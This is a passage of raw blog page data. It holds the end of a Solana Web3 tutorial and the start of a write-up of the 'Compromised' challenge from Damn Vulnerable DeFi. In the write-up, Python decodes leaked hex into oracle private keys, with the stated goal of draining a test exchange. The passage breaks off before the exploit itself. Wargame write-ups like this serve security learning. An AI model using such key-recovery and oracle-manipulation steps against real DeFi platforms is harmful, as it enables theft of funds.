class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>counter <span class=\"token operator\">=</span> fields<span class=\"token punctuation\">.</span>counter<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// Borsh schema definition for greeting accounts</span>\n<span class=\"token keyword\">const</span> GreetingSchema <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Map</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>\n  <span class=\"token punctuation\">[</span>GreetingAccount<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>kind<span class=\"token operator\">:</span> <span class=\"token string\">'struct'</span><span class=\"token punctuation\">,</span> fields<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token string\">'counter'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'u32'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">getter</span><span class=\"token punctuation\">(</span>\n  req<span class=\"token operator\">:</span> NextApiRequest<span class=\"token punctuation\">,</span>\n  res<span class=\"token operator\">:</span> NextApiResponse<span class=\"token operator\">&lt;</span><span class=\"token builtin\">string</span> <span class=\"token operator\">|</span> <span class=\"token builtin\">number</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span>network<span class=\"token punctuation\">,</span> greeter<span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> url <span class=\"token operator\">=</span> <span class=\"token function\">getNodeURL</span><span class=\"token punctuation\">(</span>network<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> connection <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Connection</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token string\">'confirmed'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> greeterPublicKey <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PublicKey</span><span class=\"token punctuation\">(</span>greeter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> accountInfo <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> connection<span class=\"token punctuation\">.</span><span class=\"token function\">getAccountInfo</span><span class=\"token punctuation\">(</span>greeterPublicKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>accountInfo <span class=\"token operator\">===</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Error: cannot find the greeted account'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token comment\">// Find the expected parameters.</span>\n    <span class=\"token comment\">// const value = new Test({ x: 255, y: 20, z: '123', q: [1, 2, 3] });</span>\n    <span class=\"token keyword\">const</span> greeting <span class=\"token operator\">=</span> borsh<span class=\"token punctuation\">.</span><span class=\"token function\">deserialize</span><span class=\"token punctuation\">(</span>\n      GreetingSchema<span class=\"token punctuation\">,</span>\n      GreetingAccount<span class=\"token punctuation\">,</span>\n      accountInfo<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// A little helper</span>\n    <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>greeting<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Pass the counter to the client-side as JSON</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span>greeting<span class=\"token punctuation\">.</span>counter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">let</span> errorMessage <span class=\"token operator\">=</span> error <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Error</span> <span class=\"token operator\">?</span> error<span class=\"token punctuation\">.</span>message <span class=\"token operator\">:</span> <span class=\"token string\">'Unknown Error'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span>errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>on-chain data(serialize) ⇒ borsh.deserialize(schema, class, buffer) ⇒ data</li>\n</ul>\n<h2 id=\"program-send-data\" style=\"position:relative;\"><a href=\"#program-send-data\" aria-label=\"program send data permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Program send data</h2>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>\n  Connection<span class=\"token punctuation\">,</span>\n  PublicKey<span class=\"token punctuation\">,</span>\n  Keypair<span class=\"token punctuation\">,</span>\n  TransactionInstruction<span class=\"token punctuation\">,</span>\n  Transaction<span class=\"token punctuation\">,</span>\n  sendAndConfirmTransaction<span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@solana/web3.js'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token keyword\">type</span> <span class=\"token punctuation\">{</span>NextApiRequest<span class=\"token punctuation\">,</span> NextApiResponse<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'next'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span>getNodeURL<span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'@figment-solana/lib'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">setter</span><span class=\"token punctuation\">(</span>\n  req<span class=\"token operator\">:</span> NextApiRequest<span class=\"token punctuation\">,</span>\n  res<span class=\"token operator\">:</span> NextApiResponse<span class=\"token operator\">&lt;</span><span class=\"token builtin\">string</span><span class=\"token operator\">></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span>greeter<span class=\"token punctuation\">,</span> secret<span class=\"token punctuation\">,</span> programId<span class=\"token punctuation\">,</span> network<span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> req<span class=\"token punctuation\">.</span>body<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> url <span class=\"token operator\">=</span> <span class=\"token function\">getNodeURL</span><span class=\"token punctuation\">(</span>network<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> connection <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Connection</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token string\">'confirmed'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> greeterPublicKey <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PublicKey</span><span class=\"token punctuation\">(</span>greeter<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> programKey <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">PublicKey</span><span class=\"token punctuation\">(</span>programId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> payerSecretKey <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Uint8Array</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>secret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> payerKeypair <span class=\"token operator\">=</span> Keypair<span class=\"token punctuation\">.</span><span class=\"token function\">fromSecretKey</span><span class=\"token punctuation\">(</span>payerSecretKey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// this your turn to figure out</span>\n    <span class=\"token comment\">// how to create this instruction</span>\n    <span class=\"token keyword\">const</span> instruction <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransactionInstruction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n      keys<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">{</span>pubkey<span class=\"token operator\">:</span> greeterPublicKey<span class=\"token punctuation\">,</span> isSigner<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> isWritable<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      programId<span class=\"token operator\">:</span> programKey<span class=\"token punctuation\">,</span>\n      data<span class=\"token operator\">:</span> Buffer<span class=\"token punctuation\">.</span><span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// All instructions are hellos</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">const</span> hash <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">sendAndConfirmTransaction</span><span class=\"token punctuation\">(</span>\n      connection<span class=\"token punctuation\">,</span>\n      <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>instruction<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">[</span>payerKeypair<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span>hash<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">error</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    res<span class=\"token punctuation\">.</span><span class=\"token function\">status</span><span class=\"token punctuation\">(</span><span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">json</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Get balance failed'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">const</span> instruction <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TransactionInstruction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  keys<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">{</span>pubkey<span class=\"token operator\">:</span> greeterPublicKey<span class=\"token punctuation\">,</span> isSigner<span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> isWritable<span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n  programId<span class=\"token operator\">:</span> programKey<span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> Buffer<span class=\"token punctuation\">.</span><span class=\"token function\">alloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// All instructions are hellos</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> hash <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token function\">sendAndConfirmTransaction</span><span class=\"token punctuation\">(</span>\n  connection<span class=\"token punctuation\">,</span>\n  <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transaction</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>instruction<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">[</span>payerKeypair<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>new TransactionInstruction instance</li>\n<li>recepient pub key , isWritable : true</li>\n<li>programId</li>\n</ul>\n<h2 id=\"other-resources\" style=\"position:relative;\"><a href=\"#other-resources\" aria-label=\"other resources permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Other Resources</h2>\n<ul>\n<li><a href=\"https://github.com/solana-labs/dapp-scaffold\">🏗 The Solana dapp-scaffold</a></li>\n<li><a href=\"https://github.com/project-serum/anchor\">⚓️ Project Serum’s Anchor framework</a></li>\n<li><a href=\"https://dev.to/dabit3/the-complete-guide-to-full-stack-solana-development-with-react-anchor-rust-and-phantom-3291\">📚 A complete guide to full-stack Solana development</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#generate-key-pair\">generate key pair</a></p>\n</li>\n<li>\n<p><a href=\"#sol-balance-mainnet-testnet\">SOL balance (mainnet, testnet)</a></p>\n</li>\n<li>\n<p><a href=\"#air-drop\">Air Drop</a></p>\n</li>\n<li>\n<p><a href=\"#user-balance-check\">User Balance Check</a></p>\n</li>\n<li>\n<p><a href=\"#sol-transfer\">SOL Transfer</a></p>\n</li>\n<li>\n<p><a href=\"#systemprogram\">SystemProgram</a></p>\n</li>\n<li>\n<p><a href=\"#systemprogramtransfer\">SystemProgram.transfer</a></p>\n</li>\n<li>\n<p><a href=\"#send\">send</a></p>\n</li>\n<li>\n<p><a href=\"#program-deploy-with-simple-contract-librs\">program deploy (with simple Contract lib.rs)</a></p>\n</li>\n<li>\n<p><a href=\"#greetingaccount-struct\">GreetingAccount Struct</a></p>\n</li>\n<li>\n<p><a href=\"#program-entrypointer-settings\">Program EntryPointer Settings</a></p>\n</li>\n<li>\n<p><a href=\"#process_instruction\">process_instruction</a></p>\n</li>\n<li>\n<p><a href=\"#program_id-pubkey\">program_id: &#x26;Pubkey,</a></p>\n</li>\n<li>\n<p><a href=\"#accounts-accountinfo\">accounts: &#x26;[AccountInfo],</a></p>\n</li>\n<li>\n<p><a href=\"#solana-cli-air-drop-pub-keypair\">Solana cli (air drop, pub keypair)</a></p>\n</li>\n<li>\n<p><a href=\"#deploy-a-solana-program\">Deploy a Solana Program</a></p>\n<ul>\n<li><a href=\"#building-the-program\">Building the program</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#deploying-the-program\">Deploying the program</a></p>\n</li>\n<li>\n<p><a href=\"#progmra-storage-create\">Progmra Storage Create</a></p>\n</li>\n<li>\n<p><a href=\"#publickey-generate\">PublicKey Generate</a></p>\n</li>\n<li>\n<p><a href=\"#program-getter-data\">Program getter data</a></p>\n</li>\n<li>\n<p><a href=\"#program-send-data\">Program send data</a></p>\n</li>\n<li>\n<p><a href=\"#other-resources\">Other Resources</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"August 01, 2022","title":"Solana Chain analysis Program && Web3 API","categories":"Solana","author":"Zer0Luck","emoji":"🌞"},"fields":{"slug":"/solana-chain-Program-Web3-API/"}},"prev":{"id":"768fcdf1-e990-509b-bd61-ce58e87b53fe","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACfklEQVQoz02Ry2sTYRTFv8wrM2Oek+m0mcxkvm+SNJmmSZrm0UnaTBuahGSwaUvTlIqmjaWtaBHtRkpBBN1UoaJu3Lhz4UY3RXwUoRvdFClYBAVFuhKX/gGCjIIIl8PhcM9d/C7YXT/dHit5uAGHJ+b0ak6vxvelvD0Jvm/IJyQ5IeHlB709Cc7ySbdvIJZvLt96VFu/oVa6AIkxgYvgdohRCkZZKohpQUyLclaCeb+c8UuZQDDrl7Ni0EriGXN24+b0lZ1YaxPYKIhTCskgklEJGlpqhySDcDsS/EOinEXhoqLqMhyBoWJQ1SWYT4w09UY3YiwCnFFJVxyjwjZCJh1RgCs2SgG4AnAJYAEbIVvGFsAohWJVkkY2m0jSiGDUU+4o0Aqz86vb1fpqfrydqXYq9fOV6TWj2tGLzWr9TDw5aZRb5lQnMVQFwE8zMJ+uEDTE7YhxRoCaNufObtYbazmjXWws6aWFiamVqtkdzpn62IwaGRWDObV/jO9NamG90bj09egEIgNgotOrgYBWLphLw6PzyVwzrM8Hw5VssVUozQ0kJhS1YG1gEgC9Pf7M571Xh8+O3735tbH2EKeRnQ0DT7DIxWo8LLuEvEut8QFDiJSlkMELgxgFcTuk2BBBQyeX6qzcub3z8sHd91tXH/tFHZAyuLC8de3ybmtqMxAq+zRTRJO90QqMVjw+jXVFCBr9HYoN9UmlVHqhXOqOZNs8n3GwKfDj4Pjn25OPTz9cPHdd6q+6+WHGqTHOqMWWQf/KBI1I6wRyO3KKezHFbRd898Hhk9ffXhx93/+yd+95LDQOCOkPTIvn/02Ctj7PuiLxYLelHiyFP80o+78Bd9KA2B3FcP4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Compromised-contract\"\n        title=\"Compromised-contract\"\n        src=\"/static/231ded7678d7eb540954df2d45691403/37523/c7.png\"\n        srcset=\"/static/231ded7678d7eb540954df2d45691403/e9ff0/c7.png 180w,\n/static/231ded7678d7eb540954df2d45691403/f21e7/c7.png 360w,\n/static/231ded7678d7eb540954df2d45691403/37523/c7.png 720w,\n/static/231ded7678d7eb540954df2d45691403/e996b/c7.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>Wargame Provider: @tinchoabbate</strong></p>\n<blockquote>\n<p>Challenge #7 — Compromised <br></p>\n</blockquote>\n<p>While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">HTTP/2 200 OK\ncontent-type: text/html\ncontent-language: en\nvary: Accept-Encoding\nserver: cloudflare4d\n\n48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 354d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34</code></pre></div>\n<ul>\n<li>\n<p>A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each</p>\n</li>\n<li>\n<p>This price is fetched from an on-chain oracle, and is based on three trusted re   porters: <code class=\"language-text\">0xA73209FB1a42495120166736362A1DfA9F95A105,0xe92401A4d3af5E446d93D11EEc806b1462b39D15 and 0x81A5D6E50C214044bE44cA0CB057fe119097850c</code>.</p>\n</li>\n</ul>\n<p>Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.</p>\n<ul>\n<li>See the contracts</li>\n<li>Complete the challenge</li>\n</ul>\n<h2 id=\"information-gathering\" style=\"position:relative;\"><a href=\"#information-gathering\" aria-label=\"information gathering permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Information Gathering</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> web3<span class=\"token punctuation\">.</span>auto <span class=\"token keyword\">import</span> w3\ntxDecode <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x<span class=\"token punctuation\">:</span> w3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>account<span class=\"token punctuation\">.</span>privateKeyToAccount<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n\nd1 <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35'''</span>\n<span class=\"token comment\"># => 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9</span>\n\ntxDecode<span class=\"token punctuation\">(</span><span class=\"token string\">'0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>address\n\n<span class=\"token string\">'0xe92401A4d3af5E446d93D11EEc806b1462b39D15'</span>\n\n\nd2 <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34'''</span>\n<span class=\"token comment\"># => 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48</span>\n<span class=\"token string\">'0x81A5D6E50C214044bE44cA0CB057fe119097850c'</span> </code></pre></div>\n<p>If you analyze some hex data on the target defi web application server side, you can check the specific signature. After base64 decoding, you can check the specific transaction structure. You can check the value of the Ethereum address. If you analyze the structure through the actual web3 module, you can confirm that it actually belongs to the Oracle address of this contract.</p>\n<h2 id=\"deploy-script-flow\" style=\"position:relative;\"><a href=\"#deploy-script-flow\" aria-label=\"deploy script flow permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Deploy Script Flow</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">1. attacker Signer\n- deployer\n- attacker\n2. contract deploy\n- Exchange\n- DamnValunableNFT\n- TrustFulOracle\n- TrustFulOracleInitializer</code></pre></div>\n<h2 id=\"balance-settings\" style=\"position:relative;\"><a href=\"#balance-settings\" aria-label=\"balance settings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 